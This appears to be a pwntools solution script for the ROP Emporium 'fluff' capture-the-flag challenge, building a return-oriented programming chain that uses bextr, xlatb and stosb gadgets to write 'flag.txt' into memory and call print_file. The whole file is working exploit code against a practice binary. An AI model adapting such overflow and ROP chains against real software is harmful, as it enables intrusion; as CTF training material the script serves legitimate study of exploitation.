from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge6/64/fluff'
bin= ELF(bin)
context.binary = bin
context.log_level = 'info'
offset= 40

current_rax= 0xb
base, addr = 0x400000, 0x601068
flag=['f', 'l', 'a', 'g', '.','t','x','t']
locations= [0x3c4, 0x239, 0x3d6, 0x3cf,  0x24e, 0x192,  0x246,  0x192]
actual_loc= []

for i in locations:
    i = hex(0x400000+i)
    actual_loc.append(i)
print(actual_loc)

print= bin.plt['print_file']
pop_rdi= next(bin.search(asm('pop rdi; ret;')))
rbx= next(bin.search(asm('pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;')))
write= next(bin.search(asm('stosb byte ptr [rdi], al; ret;')))
setal= next(bin.search(asm('xlatb; ret;')))

chain= flat(b'A'* offset)
for i in range(8):
    if (i!=0):
        current_rax= ord(flag[i-1])
    chain+= p64(rbx)
    chain+=p64(0x4000)
    p=int(actual_loc[i], 16) - current_rax - 0x3ef2
    chain+= p64(p)
    chain+=p64(setal)
    chain+=p64(pop_rdi)
    chain+=p64(addr + i )
    chain+=p64(write)

chain += flat(p64(pop_rdi), p64(addr), p64(print))
p=process(bin.path); p.send(chain) ; p.interactive()
